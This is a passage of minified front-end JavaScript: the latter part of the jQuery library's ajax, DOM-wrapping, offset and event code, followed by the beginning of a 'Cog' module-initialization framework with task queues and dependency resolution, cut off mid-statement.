v.data),!1===v.cache&&(f=f.replace(Dt,"$1"),o=(Tt.test(f)?"&":"?")+"_="+wt.guid+++o),v.url=f+o),v.ifModified&&(S.lastModified[f]&&T.setRequestHeader("If-Modified-Since",S.lastModified[f]),S.etag[f]&&T.setRequestHeader("If-None-Match",S.etag[f])),(v.data&&v.hasContent&&!1!==v.contentType||t.contentType)&&T.setRequestHeader("Content-Type",v.contentType),T.setRequestHeader("Accept",v.dataTypes[0]&&v.accepts[v.dataTypes[0]]?v.accepts[v.dataTypes[0]]+("*"!==v.dataTypes[0]?", "+Rt+"; q=0.01":""):v.accepts["*"]),v.headers)T.setRequestHeader(i,v.headers[i]);if(v.beforeSend&&(!1===v.beforeSend.call(y,T,v)||h))return T.abort();if(u="abort",b.add(v.complete),T.done(v.success),T.fail(v.error),c=Wt(Pt,v,t,T)){if(T.readyState=1,g&&m.trigger("ajaxSend",[T,v]),h)return T;v.async&&0<v.timeout&&(d=C.setTimeout(function(){T.abort("timeout")},v.timeout));try{h=!1,c.send(a,l)}catch(e){if(h)throw e;l(-1,e)}}else l(-1,"No Transport");function l(e,t,n,r){var i,o,a,s,u,l=t;h||(h=!0,d&&C.clearTimeout(d),c=void 0,p=r||"",T.readyState=0<e?4:0,i=200<=e&&e<300||304===e,n&&(s=function(e,t,n){var r,i,o,a,s=e.contents,u=e.dataTypes;while("*"===u[0])u.shift(),void 0===r&&(r=e.mimeType||t.getResponseHeader("Content-Type"));if(r)for(i in s)if(s[i]&&s[i].test(r)){u.unshift(i);break}if(u[0]in n)o=u[0];else{for(i in n){if(!u[0]||e.converters[i+" "+u[0]]){o=i;break}a||(a=i)}o=o||a}if(o)return o!==u[0]&&u.unshift(o),n[o]}(v,T,n)),!i&&-1<S.inArray("script",v.dataTypes)&&S.inArray("json",v.dataTypes)<0&&(v.converters["text script"]=function(){}),s=function(e,t,n,r){var i,o,a,s,u,l={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)l[a.toLowerCase()]=e.converters[a];o=c.shift();while(o)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=o,o=c.shift())if("*"===o)o=u;else if("*"!==u&&u!==o){if(!(a=l[u+" "+o]||l["* "+o]))for(i in l)if((s=i.split(" "))[1]===o&&(a=l[u+" "+s[0]]||l["* "+s[0]])){!0===a?a=l[i]:!0!==l[i]&&(o=s[0],c.unshift(s[1]));break}if(!0!==a)if(a&&e["throws"])t=a(t);else try{t=a(t)}catch(e){return{state:"parsererror",error:a?e:"No conversion from "+u+" to "+o}}}return{state:"success",data:t}}(v,s,T,i),i?(v.ifModified&&((u=T.getResponseHeader("Last-Modified"))&&(S.lastModified[f]=u),(u=T.getResponseHeader("etag"))&&(S.etag[f]=u)),204===e||"HEAD"===v.type?l="nocontent":304===e?l="notmodified":(l=s.state,o=s.data,i=!(a=s.error))):(a=l,!e&&l||(l="error",e<0&&(e=0))),T.status=e,T.statusText=(t||l)+"",i?x.resolveWith(y,[o,l,T]):x.rejectWith(y,[T,l,a]),T.statusCode(w),w=void 0,g&&m.trigger(i?"ajaxSuccess":"ajaxError",[T,v,i?o:a]),b.fireWith(y,[T,l]),g&&(m.trigger("ajaxComplete",[T,v]),--S.active||S.event.trigger("ajaxStop")))}return T},getJSON:function(e,t,n){return S.get(e,t,n,"json")},getScript:function(e,t){return S.get(e,void 0,t,"script")}}),S.each(["get","post"],function(e,i){S[i]=function(e,t,n,r){return m(t)&&(r=r||n,n=t,t=void 0),S.ajax(S.extend({url:e,type:i,dataType:r,data:t,success:n},S.isPlainObject(e)&&e))}}),S.ajaxPrefilter(function(e){var t;for(t in e.headers)"content-type"===t.toLowerCase()&&(e.contentType=e.headers[t]||"")}),S._evalUrl=function(e,t,n){return S.ajax({url:e,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,converters:{"text script":function(){}},dataFilter:function(e){S.globalEval(e,t,n)}})},S.fn.extend({wrapAll:function(e){var t;return this[0]&&(m(e)&&(e=e.call(this[0])),t=S(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstElementChild)e=e.firstElementChild;return e}).append(this)),this},wrapInner:function(n){return m(n)?this.each(function(e){S(this).wrapInner(n.call(this,e))}):this.each(function(){var e=S(this),t=e.contents();t.length?t.wrapAll(n):e.append(n)})},wrap:function(t){var n=m(t);return this.each(function(e){S(this).wrapAll(n?t.call(this,e):t)})},unwrap:function(e){return this.parent(e).not("body").each(function(){S(this).replaceWith(this.childNodes)}),this}}),S.expr.pseudos.hidden=function(e){return!S.expr.pseudos.visible(e)},S.expr.pseudos.visible=function(e){return!!(e.offsetWidth||e.offsetHeight||e.getClientRects().length)},S.ajaxSettings.xhr=function(){try{return new C.XMLHttpRequest}catch(e){}};var Bt={0:200,1223:204},$t=S.ajaxSettings.xhr();y.cors=!!$t&&"withCredentials"in $t,y.ajax=$t=!!$t,S.ajaxTransport(function(i){var o,a;if(y.cors||$t&&!i.crossDomain)return{send:function(e,t){var n,r=i.xhr();if(r.open(i.type,i.url,i.async,i.username,i.password),i.xhrFields)for(n in i.xhrFields)r[n]=i.xhrFields[n];for(n in i.mimeType&&r.overrideMimeType&&r.overrideMimeType(i.mimeType),i.crossDomain||e["X-Requested-With"]||(e["X-Requested-With"]="XMLHttpRequest"),e)r.setRequestHeader(n,e[n]);o=function(e){return function(){o&&(o=a=r.onload=r.onerror=r.onabort=r.ontimeout=r.onreadystatechange=null,"abort"===e?r.abort():"error"===e?"number"!=typeof r.status?t(0,"error"):t(r.status,r.statusText):t(Bt[r.status]||r.status,r.statusText,"text"!==(r.responseType||"text")||"string"!=typeof r.responseText?{binary:r.response}:{text:r.responseText},r.getAllResponseHeaders()))}},r.onload=o(),a=r.onerror=r.ontimeout=o("error"),void 0!==r.onabort?r.onabort=a:r.onreadystatechange=function(){4===r.readyState&&C.setTimeout(function(){o&&a()})},o=o("abort");try{r.send(i.hasContent&&i.data||null)}catch(e){if(o)throw e}},abort:function(){o&&o()}}}),S.ajaxPrefilter(function(e){e.crossDomain&&(e.contents.script=!1)}),S.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(e){return S.globalEval(e),e}}}),S.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),S.ajaxTransport("script",function(n){var r,i;if(n.crossDomain||n.scriptAttrs)return{send:function(e,t){r=S("<script>").attr(n.scriptAttrs||{}).prop({charset:n.scriptCharset,src:n.url}).on("load error",i=function(e){r.remove(),i=null,e&&t("error"===e.type?404:200,e.type)}),E.head.appendChild(r[0])},abort:function(){i&&i()}}});var _t,zt=[],Ut=/(=)\?(?=&|$)|\?\?/;S.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=zt.pop()||S.expando+"_"+wt.guid++;return this[e]=!0,e}}),S.ajaxPrefilter("json jsonp",function(e,t,n){var r,i,o,a=!1!==e.jsonp&&(Ut.test(e.url)?"url":"string"==typeof e.data&&0===(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&Ut.test(e.data)&&"data");if(a||"jsonp"===e.dataTypes[0])return r=e.jsonpCallback=m(e.jsonpCallback)?e.jsonpCallback():e.jsonpCallback,a?e[a]=e[a].replace(Ut,"$1"+r):!1!==e.jsonp&&(e.url+=(Tt.test(e.url)?"&":"?")+e.jsonp+"="+r),e.converters["script json"]=function(){return o||S.error(r+" was not called"),o[0]},e.dataTypes[0]="json",i=C[r],C[r]=function(){o=arguments},n.always(function(){void 0===i?S(C).removeProp(r):C[r]=i,e[r]&&(e.jsonpCallback=t.jsonpCallback,zt.push(r)),o&&m(i)&&i(o[0]),o=i=void 0}),"script"}),y.createHTMLDocument=((_t=E.implementation.createHTMLDocument("").body).innerHTML="<form></form><form></form>",2===_t.childNodes.length),S.parseHTML=function(e,t,n){return"string"!=typeof e?[]:("boolean"==typeof t&&(n=t,t=!1),t||(y.createHTMLDocument?((r=(t=E.implementation.createHTMLDocument("")).createElement("base")).href=E.location.href,t.head.appendChild(r)):t=E),o=!n&&[],(i=N.exec(e))?[t.createElement(i[1])]:(i=xe([e],t,o),o&&o.length&&S(o).remove(),S.merge([],i.childNodes)));var r,i,o},S.fn.load=function(e,t,n){var r,i,o,a=this,s=e.indexOf(" ");return-1<s&&(r=ht(e.slice(s)),e=e.slice(0,s)),m(t)?(n=t,t=void 0):t&&"object"==typeof t&&(i="POST"),0<a.length&&S.ajax({url:e,type:i||"GET",dataType:"html",data:t}).done(function(e){o=arguments,a.html(r?S("<div>").append(S.parseHTML(e)).find(r):e)}).always(n&&function(e,t){a.each(function(){n.apply(this,o||[e.responseText,t,e])})}),this},S.expr.pseudos.animated=function(t){return S.grep(S.timers,function(e){return t===e.elem}).length},S.offset={setOffset:function(e,t,n){var r,i,o,a,s,u,l=S.css(e,"position"),c=S(e),f={};"static"===l&&(e.style.position="relative"),s=c.offset(),o=S.css(e,"top"),u=S.css(e,"left"),("absolute"===l||"fixed"===l)&&-1<(o+u).indexOf("auto")?(a=(r=c.position()).top,i=r.left):(a=parseFloat(o)||0,i=parseFloat(u)||0),m(t)&&(t=t.call(e,n,S.extend({},s))),null!=t.top&&(f.top=t.top-s.top+a),null!=t.left&&(f.left=t.left-s.left+i),"using"in t?t.using.call(e,f):c.css(f)}},S.fn.extend({offset:function(t){if(arguments.length)return void 0===t?this:this.each(function(e){S.offset.setOffset(this,t,e)});var e,n,r=this[0];return r?r.getClientRects().length?(e=r.getBoundingClientRect(),n=r.ownerDocument.defaultView,{top:e.top+n.pageYOffset,left:e.left+n.pageXOffset}):{top:0,left:0}:void 0},position:function(){if(this[0]){var e,t,n,r=this[0],i={top:0,left:0};if("fixed"===S.css(r,"position"))t=r.getBoundingClientRect();else{t=this.offset(),n=r.ownerDocument,e=r.offsetParent||n.documentElement;while(e&&(e===n.body||e===n.documentElement)&&"static"===S.css(e,"position"))e=e.parentNode;e&&e!==r&&1===e.nodeType&&((i=S(e).offset()).top+=S.css(e,"borderTopWidth",!0),i.left+=S.css(e,"borderLeftWidth",!0))}return{top:t.top-i.top-S.css(r,"marginTop",!0),left:t.left-i.left-S.css(r,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent;while(e&&"static"===S.css(e,"position"))e=e.offsetParent;return e||re})}}),S.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(t,i){var o="pageYOffset"===i;S.fn[t]=function(e){return $(this,function(e,t,n){var r;if(x(e)?r=e:9===e.nodeType&&(r=e.defaultView),void 0===n)return r?r[i]:e[t];r?r.scrollTo(o?r.pageXOffset:n,o?n:r.pageYOffset):e[t]=n},t,e,arguments.length)}}),S.each(["top","left"],function(e,n){S.cssHooks[n]=Fe(y.pixelPosition,function(e,t){if(t)return t=We(e,n),Pe.test(t)?S(e).position()[n]+"px":t})}),S.each({Height:"height",Width:"width"},function(a,s){S.each({padding:"inner"+a,content:s,"":"outer"+a},function(r,o){S.fn[o]=function(e,t){var n=arguments.length&&(r||"boolean"!=typeof e),i=r||(!0===e||!0===t?"margin":"border");return $(this,function(e,t,n){var r;return x(e)?0===o.indexOf("outer")?e["inner"+a]:e.document.documentElement["client"+a]:9===e.nodeType?(r=e.documentElement,Math.max(e.body["scroll"+a],r["scroll"+a],e.body["offset"+a],r["offset"+a],r["client"+a])):void 0===n?S.css(e,t,i):S.style(e,t,n,i)},s,n?e:void 0,n)}})}),S.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){S.fn[t]=function(e){return this.on(t,e)}}),S.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)},hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),S.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,n){S.fn[n]=function(e,t){return 0<arguments.length?this.on(n,null,e,t):this.trigger(n)}});var Xt=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;S.proxy=function(e,t){var n,r,i;if("string"==typeof t&&(n=e[t],t=e,e=n),m(e))return r=s.call(arguments,2),(i=function(){return e.apply(t||this,r.concat(s.call(arguments)))}).guid=e.guid=e.guid||S.guid++,i},S.holdReady=function(e){e?S.readyWait++:S.ready(!0)},S.isArray=Array.isArray,S.parseJSON=JSON.parse,S.nodeName=A,S.isFunction=m,S.isWindow=x,S.camelCase=X,S.type=w,S.now=Date.now,S.isNumeric=function(e){var t=S.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},S.trim=function(e){return null==e?"":(e+"").replace(Xt,"")},"function"==typeof define&&define.amd&&define("jquery",[],function(){return S});var Vt=C.jQuery,Gt=C.$;return S.noConflict=function(e){return C.$===S&&(C.$=Gt),e&&C.jQuery===S&&(C.jQuery=Vt),S},"undefined"==typeof e&&(C.jQuery=C.$=S),S});
var Cog=function(e,t){"use strict";var n={component:{}},i={noOperation:t.noop,emptyArray:[],initializedClass:"initialized",initializedSelector:".initialized",globalScopeSelector:"body",modulesGroupSize:50},s=function(){var e=Object.prototype.constructor;function n(n,i){var s=i||{};n=n||Object;var r=s.constructor!=e?s.constructor:function(){n.apply(this,arguments)},o=n.prototype,u=function(){};u.prototype=o;var l=t.extend(new u,s);return l.constructor=r,r.prototype=l,r.superclass=o,r}return{define:function(e){return n(null,e)},extend:n,asSingleton:function(e){var t={};return t.create=function(){var t=function(e){var t=n(e,{constructor:function(e){t.superclass.constructor.apply(this,e)}});return t}(e);return function(e,t){var n={instance:function(){return t}};return n.superclass=e.superclass,n}(e,new t(arguments))},t}}}(),r=s.define({eventManager:null,addModule:function(e){},queueInitTask:function(e,t){},queueFinalizeTask:function(e){},isValidModuleConfig:function(e){},isReady:function(){},whenReady:function(e){}}),o=s.define({dispatcherFor:function(e,t){}}),u=s.define({dependencyGraph:null,modules:null,staticModuleRegistry:null,dynamicModuleRegistry:null,add:function(e){}}),l=s.define({initStaticModule:null,initDynamicModules:null,finalizeDynamicModules:null}),a=1,c=3,d=5,h=s.define({level:a,source:null,constructor:function(e,t){this.source=e,this.level=t||a},error:function(e){},info:function(e){},debug:function(e){},trace:function(e){},isEnabled:function(e){return e<=this.level}}),f=s.define({constructor:function(e){},create:function(e,t){}}),p=s.asSingleton(s.extend(f,{logger:new h,create:function(e,t){return this.logger}})).create().instance(),g=s.define({items:null,ids:null,map:null,constructor:function(){this.items=[],this.ids=[],this.map={}},add:function(e,t){this.map[e]||(this.map[e]=t,this.ids.push(e),this.items.push(t))},count:function(){return this.items.length},get:function(e){return this.map[e]||null},has:function(e){return this.map.hasOwnProperty(e)},select:function(e){var t,n,i=new g,s=this.map,r=this.filterIds(e);for(n=0;n<r.length;n++)t=r[n],i.add(t,s[t]);return i},selectValues:function(e){var t,n,i={},s=this.map,r=this.filterIds(e);for(n=0;n<r.length;n++)i[t=r[n]]=s[t];return i},filterIds:function(e){var t,n=[],i=this.uniqueIds(e),s=this.map;for(t=0;t<i.length;t++)s.hasOwnProperty(i[t])&&n.push(i[t]);return n},uniqueIds:function(e){var t,n,i=[],s={};for(n=0;n<e.length;n++)s[t=e[n]]||(s[t]=!0,i.push(t));return this.sortedIds(i)},sortedIds:function(e){var n=t.proxy(this.uniqueIdsSorter,this,this.ids);return e.sort(n),e},uniqueIdsSorter:function(e,n,i){return t.inArray(n,e)-t.inArray(i,e)}}),m=s.define({current:0,next:function(e,t){return this.current++,this.current}}),v=s.asSingleton(s.define({indexOfElement:function(e,t){var n,i=-1;for(n=0;i<0&&n<e.length;n++)t.is(e[n])&&(i=n);return i},find:function(e,t){var n=e.find(t),i=e.filter(t);return i.length>0?n.add(i):n},isInScope:function(e,t){return null!=e&&null!=t&&t.parents().is(e)}})).create().instance(),x=s.asSingleton(s.define({defaults:{itemsPerGroup:1},initializeGroupSize:function(e){return e>0?e:this.defaults.itemsPerGroup},groupItems:function(e,t){var n,i=this.initializeGroupSize(t),s=this.createContext(i),r=s.group;for(n in e)e.hasOwnProperty(n)&&(r[n]=e[n],r=this.update(s));return this.flush(s),s.groups},createContext:function(e){return{group:{},groups:[],counter:e,groupSize:e}},update:function(e){return e.counter--,e.counter<1&&(e.counter=e.groupSize,e.groups.push(e.group),e.group={}),e.group},flush:function(e){e.counter!==e.groupSize&&e.groups.push(e.group)}})).create().instance(),y=s.asSingleton(s.define({create:function(e,n){var i,s,r={};for(s=0;s<n.length;s++)i=n[s],t.isFunction(e[i])&&(r[i]=t.proxy(e[i],e));return r}})).create().instance(),I=s.define({id:null,isProcessed:!1,resolved:!1,dependencies:null,requiredBy:null,constructor:function(e){this.id=e,this.dependencies=[],this.requiredBy=[]},isResolved:function(){return this.resolved},resolveIfRequired:function(){this.resolved||this.resolve()},resolve:function(){var e,t=this.dependencies,n=!0;for(e=0;n&&e<t.length;e++)n=t[e].resolved;this.resolved=n},resolveAllPredecessors:function(){var e=[],t=this.unresolvedPredecessor();return t.length&&this.resolvePredecessors(t,e),e},unresolvedPredecessor:function(){var e,t,n=[],i=this.requiredBy;for(t=0;t<i.length;t++)(e=i[t]).resolved||n.push(e);return n},resolvePredecessors:function(e,t){for(var n;e.length>0;)(n=e.shift()).resolve(),n.resolved&&(e.push.apply(e,n.unresolvedPredecessor()),t.push(n.id))}}),M=s.define({id:function(e){},dependencies:function(e){},dependencyId:function(e){}}),S=s.define({adapter:null,nodes:null,constructor:function(e){this.adapter=e,this.nodes={}},resolve:function(e){var t=null,n=this.getNode(this.adapter.id(e));return n.isProcessed||this.processDependencies(n,this.adapter.dependencies(e)),n.resolveIfRequired(),n.isResolved()&&(t=n.resolveAllPredecessors()).unshift(n.id),t},hasNode:function(e){var t=this.nodes[this.adapter.id(e)];return t&&t.isProcessed},getNode:function(e){return null==this.nodes[e]&&(this.nodes[e]=new I(e)),this.nodes[e]},processDependencies:function(e,t){var n,i;for(i=0;i<t.length;i++)n=this.getNode(this.adapter.dependencyId(t[i])),e.dependencies.push(n),n.requiredBy.push(e);e.isProcessed=!0}}),z=s.define({id:null,delegate:null,scope:null,params:null,disposable:!1,constructor:function(e,t,n){this.id=e.id,this.delegate=t||i.noOperation,this.params={data:{},eventData:{}},n&&this.processOptions(n)},isDisposable:function(){return this.disposable},processOptions:function(e){e.scope&&(this.scope=e.scope),e.data&&(this.params.data=e.data),this.disposable=!0===e.disposable}}),k=s.asSingleton(s.define({create:function(e,t,n){return{module:e,event:t,id:n}}})).create(),b=s.define({asyncDelegatesCount:i.modulesGroupSize,moduleName:null,eventName:null,handlers:null,ids:null,metadataFactory:null,constructor:function(e,t){this.moduleName=e,this.eventName=t,this.metadataFactory=k.instance(),this.handlers=[],this.ids={}},addHandler:function(e,n){var i,s,r=null;return t.isFunction(e)&&(s=this.generateUniqueId(),this.ids[s]=!0,r=this.metadataFactory.create(this.moduleName,this.eventName,s),(i=new z(r,e,n)).isDisposable()&&(i.delegate=this.disposableHandler(i)),this.handlers.push(i)),r},removeHandler:function(e){var t=this.indexOfHandler(e),n=t>-1;return t>-1&&(delete this.ids[e],this.handlers.splice(t,1)),n},dispatch:function(e){var n,i,s,r=this.handlers.slice(0);for(s=0;s<r.length;s++)n=r[s],i=t.extend({},n.params),e&&(i.eventData=e),n.delegate.call(n.scope,i)},dispatchAsync:function(e){var n,i=this.createDelegates(e),s=Math.ceil(i.length/this.asyncDelegatesCount);for(n=0;n<s;n++)setTimeout(t.proxy(this.executeAsync,this,i,n))},createDelegates:function(e){var n,i,s,r=this.handlers.slice(0),o=[];for(s=0;s<r.length;s++)n=r[s],i=t.extend({},n.params),e&&(i.eventData=e),o.push({handler:n,params:i});return o},executeAsync:function(e,t){var n,i,s,r=t*this.asyncDelegatesCount,o=Math.min(r+this.asyncDelegatesCount,e.length);for(s=r;s<o;s++)(n=(i=e[s]).handler).delegate.call(n.scope,i.params)},disposableHandler:function(e){var t=e.delegate,n=this;return function(i){t.call(e.scope,i),n.removeHandler(e.id)}},indexOfHandler:function(e){var t,n=this.handlers,i=-1;for(t=0;i<0&&t<n.length;t++)n[t].id===e&&(i=t);return i},generateUniqueId:function(){var e,t=this.ids;do{e=Math.round((new Date).getTime()*Math.random())}while(null!=t[e]);return e}}),w=s.define({hasNext:function(){},next:function(){},nextId:function(){},last:function(){},lastId:function(){},add:function(e){}}),R=s.extend(w,{queues:null,constructor:function(){this.queues=[]},hasNext:function(){var e,t=this.queues,n=!1;for(e=0;!n&&e<t.length;e++)n=t[e].hasNext();return n},next:function(){var e=this.nextQueue();return null!=e?e.next():null},nextId:function(){var e=this.nextQueue();return null!=e?e.nextId():null},last:function(){var e=this.lastQueue();return null!=e?e.last():null},lastId:function(){var e=this.lastQueue();return null!=e?e.lastId():null},addQueue:function(e){this.queues.push(e)},nextQueue:function(){var e,t,n=this.queues,i=null,s=Number.MAX_VALUE;for(t=0;t<n.length;t++)null!==(e=n[t].nextId())&&e<s&&(s=e,i=n[t]);return i},lastQueue:function(){var e,t,n=this.queues,i=null,s=Number.MIN_VALUE;for(t=0;t<n.length;t++)null!==(e=n[t].nextId())&&e>s&&(s=e,i=n[t]);return i}}),A=s.define({logger:p.create("Task"),counter:new m,id:null,deferred:null,promise:null,constructor:function(){this.id=this.counter.next(),this.deferred=t.Deferred(),this.promise=this.deferred.promise(),this.logger.isEnabled(c)&&(this.promise.done(t.proxy(this.onExecuted,this)).fail(t.proxy(this.onAborted,this)),this.logger.debug("created",this.id))},execute:function(){},onExecuted:function(){this.logger.debug("executed",this.id)},onAborted:function(){this.logger.debug("aborted",this.id)}}),P=s.extend(w,{logger:p.create("TaskQueue"),tasks:null,constructor:function(){this.tasks=[]},hasNext:function(){return this.tasks.length>0},next:function(){return this.hasNext()?this.tasks.shift():null},nextId:function(){return this.hasNext()?this.tasks[0].id:null},last:function(){return this.hasNext()?this.tasks.pop():null},lastId:function(){var e=null;if(this.hasNext()){var t=this.tasks;e=t[t.length-1]}return e},add:function(e){var t=this.logger;t.debug("adding task",e.id),this.accepts(e)?(t.debug("task accepted",e.id),this.process(e)):(t.debug("task rejected",e.id),e.deferred.reject())},accepts:function(e){return!0},process:function(e){this.tasks.push(e)}}),$=s.define({logger:p.create("TaskRunner"),delay:0,queues:null,locked:!1,constructor:function(e){this.queues=[],e>0&&(this.delay=e)},executeNext:function(){var e=this.logger,n=this.locked?null:this.findNext();null!=n&&(this.locked=!0,e.trace("locked"),n.promise.always(t.proxy(this.unlock,this)),e.debug("execute",n.id),this.executeAsync(n))},findNext:function(){var e,t=this.queues,n=null;for(e=0;null==n&&e<t.length;e++)n=t[e].next();return n},addQueue:function(e){this.queues.push(e)},unlock:function(){this.locked=!1,this.logger.trace("unlocked"),this.executeNext()},executeAsync:function(e){setTimeout(t.proxy(e.execute,e),this.delay)}}),q=s.define({logger:p.create("ObjectIterator"),items:null,constructor:function(e){this.items=e||{}},eachItem:function(e,n){var i=t.Deferred();try{this.executeOnEach(e,n)}catch(e){this.logger.error("error has occured",e),i.rejectWith(n,[e])}finally{this.logger.trace("processing finished"),i.resolveWith(n)}return i.promise()},executeOnEach:function(e,t){var n,i=this.logger,s=this.items;for(n in s)if(s.hasOwnProperty(n)&&(i.trace("processing",n),!1===e.call(t,s[n]))){i.trace("processing aborted by itemProcessor");break}}}),D=s.define({itemProcessor:null,scope:null,aborted:!1,deferred:null,constructor:function(e,n){this.itemProcessor=e,this.scope=n,this.aborted=!1,this.deferred=t.Deferred(),t.isFunction(e)||this.abort()},isAborted:function(){return this.aborted},abort:function(){this.aborted=!0},resolve:function(){return this.deferred.resolveWith(this.scope)},reject:function(e){return this.abort(),this.deferred.rejectWith(this.scope,[e])},promise:function(){return this.deferred.promise()},processItem:function(e){var t=this.itemProcessor.call(this.scope,e);return!1===t&&this.abort(),t}}),j=s.extend(q,{logger:p.create("AsyncObjectIterator"),defaults:{timeout:0,itemsPerExecution:1},itemsPerExecution:null,timeout:null,allItems:null,constructor:function(e,t,n){j.superclass.constructor.call(this,null);var i=this.defaults;this.allItems=e,this.itemsPerExecution=this.isNonNegative(t)?t:i.itemsPerExecution,this.timeout=this.isNonNegative(n)?n:i.timeout},eachItem:function(e,t){var n=new D(e,t),i=x.groupItems(this.allItems,this.itemsPerExecution);return this.logger.isEnabled(d)&&this.logger.trace("iterating",{groupsCount:i.length,maxGroupSize:this.itemsPerExecution,timeout:this.timeout}),this.eachItemsGroup(n,i),n.promise()},isNonNegative:function(e){return isFinite(e)&&e>=0},eachItemsGroup:function(e,n){if(!e.isAborted()&&n.length>0){this.logger.trace("iterating over group");var i=n.shift(),s=this;setTimeout(function(){s.items=i,j.superclass.eachItem.call(s,e.processItem,e).fail(t.proxy(e.reject,e)),s.eachItemsGroup(e,n)},this.timeout)}else e.resolve()}}),N=s.define({initializedSelector:i.initializedSelector,notInitializedSelector:":not("+i.initializedSelector+")",execute:function(e,t){return null}}),Q=s.extend(N,{logger:p.create("SelectElementsDefaultStrategy"),execute:function(e,t){this.logger.trace("executing");var n=this.createSelector(t),i=n?v.find(e,n):null;return this.logger.trace("executed"),i&&i.length>0?i:null},createSelector:function(e){var t,n,i=[],s=e.items;for(n=0;n<s.length;n++)(t=s[n]).selector&&this.processSelector(t.selector,i);return i.join(",")},processSelector:function(e,t){var n,i=this.notInitializedSelector,s=e.split(",");for(n=0;n<s.length;n++)t.push(s[n]+i)}}),F=s.extend(N,{logger:p.create("SelectElementsPrefetchStrategy"),tagNamePattern:/^\w+/i,execute:function(e,t){this.logger.trace("executing");var n=this.createSelectors(t),i=null;return n.prefetch&&(i=v.find(e,n.prefetch).not(this.initializedSelector)),this.logger.trace("executed"),i&&i.length>0?i:null},createSelectors:function(e){var t,n,i=this.initializeSelectors(),s=e.items;for(n=0;n<s.length;n++)(t=s[n]).selector&&this.processSelector(t.selector,i);return i.all=i.all.join(","),i.prefetch=i.prefetch.join(","),i},initializeSelectors:function(){return{all:[],prefetch:[],prefetchMap:{}}},processSelector:function(e,n){var i,s,r,o=this.tagNamePattern,u=e.split(",");for(n.all.push(e),r=0;r<u.length;r++)i=t.trim(u[r]),null!=(s=(s=o.exec(i))&&s.length?s[0]:null)&&(i=s),this.addToPrefetched(n,i)},addToPrefetched:function(e,t){e.prefetchMap[t]||(e.prefetch.push(t),e.prefetchMap[t]=!0)}}),T=s.extend(P,{relatedQueue:null,constructor:function(e){T.superclass.constructor.call(this),this.relatedQueue=e||new P},process:function(e){var t=this.joinIndex(e);null!==t?this.join(e,t):T.superclass.process.call(this,e)},join:function(e,t){},joinIndex:function(e){var t=null;if(this.tasks.length>0){var n=this.relatedQueue.lastId();t=null!==n?this.nextJoinIndex(n):0}return t},nextJoinIndex:function(e){var t,n=null,i=this.tasks;for(t=0;null!==n&&t<i.length;t++)i[t].id>e&&(n=t);return n}}),E=s.extend(A,{logger:p.create("FinalizeModulesTask"),maxGroupSize:i.modulesGroupSize,$scope:null,$elements:null,modules:null,constructor:function(e,t){E.superclass.constructor.call(this),this.modules=t,this.$scope=e},execute:function(){var e=this.logger,n=v.find(this.$scope,i.initializedSelector),s=this.deferred;n.length>0?(e.info("executing",this.id),this.$elements=n,new j(this.modules.map,this.maxGroupSize).eachItem(this.itemProcessor,this).always(t.proxy(s.resolve,s))):(e.info("nothing to do",this.id),s.resolve())},itemProcessor:function(e){var t=this.$elements.filter(e.$elements);return t.length>0&&(this.logger.trace("elements found",e.name,t.length),this.$elements=this.$elements.not(t),e.$elements=e.$elements.not(t),this.finalizeElements(e,t)),this.$elements.length>0},finalizeElements:function(e,t){var n;for(n=0;n<t.length;n++)e.finalize(t.eq(n))}}),G=s.extend(T,{logger:p.create("FinalizeModulesTaskQueue"),accepts:function(e){return e.$scope&&e.$scope.length},join:function(e,n){var i=this.tasks[n];i.$scope=i.$scope.add(e.$scope),this.logger.trace("join task",{source:e.id,target:i.id,targetIndex:n});var s=e.deferred;i.promise.always(t.proxy(s.resolve,s))}}),C=s.extend(A,{notInitializedSelector:":not("+i.initializedSelector+")",logger:p.create("InitModulesTask"),maxGroupSize:i.modulesGroupSize,elementsStrategy:null,modules:null,moduleIds:null,targetModules:null,$scope:null,$elements:null,rejectDelegate:null,isPrefetchRequired:!1,constructor:function(n,i,s){C.superclass.constructor.call(this),this.isPrefetchRequired=!t.isFunction(e.getElementsByClassName),this.isPrefetchRequired&&(this.maxGroupSize=1),this.elementsStrategy=this.selectElementsStrategy(),this.$scope=n,this.moduleIds=i?s.filterIds(i):null,this.modules=s},selectElementsStrategy:function(){return this.isPrefetchRequired?new F:new Q},processAllModules:function(){return null==this.moduleIds},execute:function(){var e=this.logger;this.targetModules=this.processAllModules()?this.modules:this.modules.select(this.moduleIds),this.targetModules.count()>0?(e.info("executing",this.id,{modulesCount:this.targetModules.count()}),this.$elements=this.elementsStrategy.execute(this.$scope,this.targetModules),this.rejectDelegate=t.proxy(this.deferred.reject,this.deferred),this.executeBeforeInit()):(e.info("nothing to do",this.id),this.deferred.resolve())},executeBeforeInit:function(){this.logger.trace("executing beforeInit()",this.id),new j(this.targetModules.map,this.maxGroupSize).eachItem(this.beforeInitProcessor,this).done(t.proxy(this.executeInit,this)).fail(this.rejectDelegate)},executeInit:function(){this.logger.trace("executing init()",this.id);var e=this.deferred;new 